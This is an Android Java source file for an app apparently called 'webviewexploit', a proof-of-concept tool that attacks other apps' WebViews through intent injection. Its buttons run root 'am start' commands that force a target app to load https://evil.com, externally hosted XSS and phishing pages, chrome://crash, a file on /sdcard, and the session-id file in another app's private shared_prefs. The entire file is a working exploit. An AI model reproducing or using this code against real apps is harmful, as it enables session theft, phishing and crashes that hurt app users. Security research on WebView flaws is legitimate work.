package com.nahid0x1.webviewexploit;

import android.os.Bundle;
import android.os.Environment;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import java.io.File;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        EditText packagename = findViewById(R.id.package_name);
        EditText vulnvalue = findViewById(R.id.vuln_string);

        Button evil = findViewById(R.id.evil);
        Button jsalert = findViewById(R.id.jsalert);
        Button lfi = findViewById(R.id.lfi);
        Button phishing = findViewById(R.id.phishing);
        Button crash = findViewById(R.id.crash);
        Button read = findViewById(R.id.read);

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        evil.setOnClickListener(v -> {
            String package_name = packagename.getText().toString();
            String vuln_value = vulnvalue.getText().toString();
            String command = "am start -n " + package_name + " -a android.intent.action.VIEW --es " + vuln_value + " https://evil.com";
            executeCommand(command);
        });

        jsalert.setOnClickListener(v -> {
            String package_name = packagename.getText().toString();
            String vuln_value = vulnvalue.getText().toString();
            String command = "am start -n " + package_name + " -a android.intent.action.VIEW --es " + vuln_value + " https://nahid0x1.github.io/xss.html";
            executeCommand(command);
        });

        lfi.setOnClickListener(v -> {
            String package_name = packagename.getText().toString();
            String vuln_value = vulnvalue.getText().toString();
            String command = "am start -n " + package_name + " -a \"android.intent.action.VIEW\" --es \"" + vuln_value + "\" \"file:///data/data/com.picsart.studio/shared_prefs/key.shop.session.id.xml\" --es \"type\" \"alert\"";
            executeCommand(command);
        });

        phishing.setOnClickListener(v -> {
            String package_name = packagename.getText().toString();
            String vuln_value = vulnvalue.getText().toString();
            String command = "am start -n " + package_name + " -a \"android.intent.action.VIEW\" --es \"" + vuln_value + "\" \"https://nahid0x1.github.io/xss2.html\"";
            executeCommand(command);
        });

        crash.setOnClickListener(v -> {
            String package_name = packagename.getText().toString();
            String vuln_value = vulnvalue.getText().toString();
            String command = "am start -n " + package_name + " -a \"android.intent.action.VIEW\" --es \"" + vuln_value + "\" \"chrome://crash\" --es \"type\" \"alert\"";
            executeCommand(command);
        });

        read.setOnClickListener(v -> {
            String package_name = packagename.getText().toString();
            String vuln_value = vulnvalue.getText().toString();
            String secretFilePath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/sdcard/secret.txt";
            File secretFile = new File(secretFilePath);

            if (secretFile.exists()) {
                String command = "am start -n " + package_name + " -a \"android.intent.action.VIEW\" --es \"" + vuln_value + "\" \"file:///sdcard/secret.txt\" --es \"type\" \"alert\"";
                executeCommand(command);
            } else {
                Toast.makeText(MainActivity.this, "file not found! first create a file named secret.txt in the /sdcard this path.", Toast.LENGTH_LONG).show();
            }
        });
    }

    private void executeCommand(String command) {
        try {
            Runtime.getRuntime().exec(new String[]{"su", "-c", command});
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
